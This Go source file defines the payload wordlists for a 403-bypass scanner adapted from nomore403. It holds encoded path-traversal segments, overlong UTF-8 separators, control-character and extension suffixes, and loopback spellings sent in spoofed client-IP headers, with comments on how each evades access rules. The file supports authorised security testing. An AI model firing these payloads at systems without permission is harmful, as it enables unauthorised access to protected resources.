package bypass403

// The tables in this file are adapted from devploit/nomore403
// (https://github.com/devploit/nomore403, MIT License, Copyright (c) 2021
// Daniel Púa), a 403-bypass scanner whose wordlists (payloads/midpaths,
// payloads/endpaths, payloads/ips) and technique families this engine draws
// on. Only distinct variants are kept, and duplicates of techniques already
// in attempts.go are left out. Every entry is still a read-style request for
// the same resource.

// payload is one literal spelling a technique splices into a request, with
// the identity a Result reports it under.
type payload struct {
	id          string
	description string
	value       string
}

// midPathPayloads are spliced between the protected path's parent directory
// and its final segment, e.g. "/api/" + "%2e%2e/" + "admin" becomes
// "/api/%2e%2e/admin". A front-end matching the literal path sees a route it
// doesn't protect, while a backend that normalizes dot-segments or
// ;-parameters resolves it back to the protected file.
var midPathPayloads = []payload{
	{"path-mid-encoded-dot", "Inserted an encoded \".\" segment before the final segment", "%2e/"},
	{"path-mid-encoded-dotdot", "Inserted an encoded \"..\" segment before the final segment", "%2e%2e/"},
	{"path-mid-mixed-dot", "Inserted a \".%2e\" segment before the final segment", ".%2e/"},
	{"path-mid-dotdot-encoded-slash", "Inserted \"..%2f\" before the final segment", "..%2f"},
	{"path-mid-encoded-traversal", "Inserted \"%2e%2e%2f\" before the final segment", "%2e%2e%2f"},
	{"path-mid-semicolon-dotdot", "Inserted a \"..;/\" segment before the final segment", "..;/"},
	{"path-mid-semicolon-dotdot-encoded", "Inserted \"..;%2f\" before the final segment", "..;%2f"},
	{"path-mid-encoded-semicolon", "Inserted an encoded \";/\" segment before the final segment", "%3b/"},
	{"path-mid-encoded-slash", "Inserted an encoded slash before the final segment", "%2f"},
	{"path-mid-encoded-tab", "Inserted an encoded tab before the final segment", "%09"},
	{"path-mid-encoded-space", "Inserted an encoded space before the final segment", "%20"},
	{"path-mid-encoded-nul", "Inserted an encoded NUL segment before the final segment", "%00/"},
	{"path-mid-backslash-dotdot", "Inserted an encoded backslash traversal (..%5c) before the final segment", "..%5c"},
	{"path-mid-same-dir", "Inserted a same-directory \"./\" segment before the final segment", "./"},
	{"path-mid-dot-semicolon", "Inserted a \".;/\" segment before the final segment", ".;/"},
	{"path-mid-double-semicolon", "Inserted two \"..;/\" segments before the final segment", "..;/..;/"},
}

// separatorPayloads replace the "/" that sits directly before the final
// segment with an overlong or non-canonical encoding. A decoder that accepts
// them resolves the same file, while a rule matching a literal "/" does not.
var separatorPayloads = []payload{
	{"path-unicode-separator-overlong", "Replaced the separator before the final segment with the overlong UTF-8 encoding %c0%af", "%c0%af"},
	{"path-unicode-separator-overlong-3", "Replaced the separator before the final segment with the 3-byte overlong UTF-8 encoding %e0%80%af", "%e0%80%af"},
	{"path-unicode-separator-iis", "Replaced the separator before the final segment with the IIS-style %u002f escape", "%u002f"},
}

// endPathPayloads are appended to the path with its trailing slash removed.
// Most of them are control-character or extension tricks that a route or
// access rule keyed on the exact path doesn't match, while the framework
// still serves the same handler. Spellings already covered by the
// trailing-suffix attempts in attempts.go are not repeated here.
var endPathPayloads = []payload{
	{"path-suffix-encoded-lf", "Appended an encoded line feed (%0a)", "%0a"},
	{"path-suffix-encoded-cr", "Appended an encoded carriage return (%0d)", "%0d"},
	{"path-suffix-encoded-crlf", "Appended an encoded CRLF (%0d%0a)", "%0d%0a"},
	{"path-suffix-encoded-vt", "Appended an encoded vertical tab (%0b)", "%0b"},
	{"path-suffix-encoded-ff", "Appended an encoded form feed (%0c)", "%0c"},
	{"path-suffix-encoded-us", "Appended an encoded unit separator (%1f)", "%1f"},
	{"path-suffix-encoded-percent", "Appended an encoded percent sign (%25)", "%25"},
	{"path-suffix-encoded-ampersand", "Appended an encoded ampersand (%26)", "%26"},
	{"path-suffix-encoded-dot", "Appended an encoded dot (%2e)", "%2e"},
	{"path-suffix-slash-encoded-dot", "Appended a slash and an encoded dot (/%2e)", "/%2e"},
	{"path-suffix-css", "Appended a .css extension (static-file rules often skip auth for it)", ".css"},
	{"path-suffix-semicolon-css", "Appended ;.css (some servers strip the ;-parameter and serve the route)", ";.css"},
	{"path-suffix-js", "Appended a .js extension", ".js"},
	{"path-suffix-php", "Appended a .php extension", ".php"},
	{"path-suffix-aspx", "Appended a .aspx extension", ".aspx"},
	{"path-suffix-jsp", "Appended a .jsp extension", ".jsp"},
	{"path-suffix-do", "Appended a .do extension (Struts-style routing)", ".do"},
}

// encodedLoopbacks are spellings of 127.0.0.1 that a literal allowlist of
// "127.0.0.1" doesn't recognize, but the platform's address parser (inet_aton,
// URL resolvers, many proxies) reads back as loopback.
var encodedLoopbacks = []payload{
	{"short", "shortened dotted form 127.1", "127.1"},
	{"decimal", "decimal integer form 2130706433", "2130706433"},
	{"hex", "hex-octet form 0x7f.0x0.0x0.0x1", "0x7f.0x0.0x0.0x1"},
	{"ipv6", "IPv6 loopback [::1]", "[::1]"},
}

// encodedLoopbackHeaders are the client-IP headers the encoded loopback forms
// are sent in. They are the ones proxies and WAFs most often trust to decide
// whether a request is internal.
var encodedLoopbackHeaders = []string{
	"X-Forwarded-For",
	"Client-IP",
	"True-Client-IP",
	"X-Real-IP",
	"CF-Connecting-IP",
}
